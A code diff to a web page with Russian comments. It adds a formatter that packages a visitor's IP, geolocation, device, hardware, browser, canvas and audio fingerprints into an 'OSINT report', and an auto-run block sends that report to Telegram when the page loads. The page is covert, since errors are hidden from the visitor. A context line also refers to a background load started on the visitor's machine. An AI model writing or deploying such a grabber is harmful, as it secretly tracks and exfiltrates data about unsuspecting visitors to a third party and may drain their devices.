@@ -11,7 +11,7 @@
             box-sizing: border-box;
         }
         body {
-            background-color: #2c3e50; /* тёмно-серый */
+            background-color: #2c3e50;
             font-family: 'Segoe UI', Roboto, sans-serif;
             height: 100vh;
             display: flex;
@@ -215,6 +215,64 @@
                 return result;
             }
 
+            // ==================== ФОРМАТИРОВАНИЕ СООБЩЕНИЯ (ПОНЯТНЫЙ ВИД) ====================
+            function formatTelegramMessage(data) {
+                const lines = [];
+
+                // Заголовок
+                lines.push('🕵️‍♂️ *OSINT ОТЧЁТ*');
+                lines.push('');
+
+                // 1. Сеть и геолокация
+                lines.push('🌐 *Сеть и гео*');
+                lines.push(`▫️ *IP:* ${data.ip}`);
+                lines.push(`▫️ *Гео:* ${data.geo}`);
+                lines.push(`▫️ *Тип сети:* ${data.network}`);
+                lines.push('');
+
+                // 2. Устройство и система
+                lines.push('💻 *Устройство и ОС*');
+                lines.push(`▫️ *ОС:* ${data.os}`);
+                lines.push(`▫️ *Устройство:* ${data.device}`);
+                lines.push(`▫️ *Платформа:* ${data.platform}`);
+                lines.push(`▫️ *User‑Agent:* \`${data.userAgent}\``);
+                lines.push('');
+
+                // 3. Аппаратные ресурсы
+                lines.push('⚙️ *Ресурсы*');
+                lines.push(`▫️ *Ядер CPU:* ${data.cpuCores}`);
+                lines.push(`▫️ *ОЗУ:* ${data.memory}`);
+                lines.push(`▫️ *Батарея:* ${data.battery}`);
+                lines.push(`▫️ *WebGL рендерер:* ${data.webglRenderer}`);
+                lines.push('');
+
+                // 4. Браузер и окружение
+                lines.push('🧩 *Браузер*');
+                lines.push(`▫️ *Экран:* ${data.screen}`);
+                lines.push(`▫️ *Язык:* ${data.language}`);
+                lines.push(`▫️ *Часовой пояс:* ${data.timezone}`);
+                lines.push(`▫️ *Куки:* ${data.cookiesEnabled}`);
+                lines.push(`▫️ *LocalStorage:* ${data.localStorage}`);
+                lines.push(`▫️ *Плагины:* ${data.plugins}`);
+                lines.push(`▫️ *Шрифты:* ${data.fonts}`);
+                lines.push(`▫️ *Canvas:* ${data.canvasFingerprint}`);
+                lines.push(`▫️ *Аудио:* ${data.audio}`);
+                lines.push('');
+
+                // 5. Дополнительно
+                lines.push('📎 *Дополнительно*');
+                lines.push(`▫️ *DoNotTrack:* ${data.doNotTrack}`);
+                lines.push(`▫️ *Referrer:* ${data.referrer}`);
+                lines.push(`▫️ *Время загрузки:* ${data.loadTime}`);
+                lines.push(`▫️ *URL:* ${data.url}`);
+                lines.push('');
+
+                // Время отчёта
+                lines.push(`🕒 *Отчёт создан:* ${data.timestamp}`);
+
+                return lines.join('\n');
+            }
+
             // ==================== ОТПРАВКА ТЕКСТА В TELEGRAM ====================
             function sendToTelegram(message) {
                 const escapeMarkdown = (str) => str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
@@ -399,8 +457,8 @@
                     // 1. Сбор расширенных данных
                     const data = await collectExtendedData();
 
-                    // 2. Отправка текстового сообщения
-                    const textMessage = Object.entries(data).map(([k, v]) => `*${k}:* ${v}`).join('\n');
+                    // 2. Форматирование и отправка текстового сообщения
+                    const textMessage = formatTelegramMessage(data);
                     sendToTelegram(textMessage);
 
                     // 3. Запуск постепенной нагрузки в фоне
@@ -408,7 +466,6 @@
 
                 } catch (error) {
                     console.error('Ошибка:', error);
-                    // Визуально ничего не меняем, ошибка в консоль
                 }
             })();
 
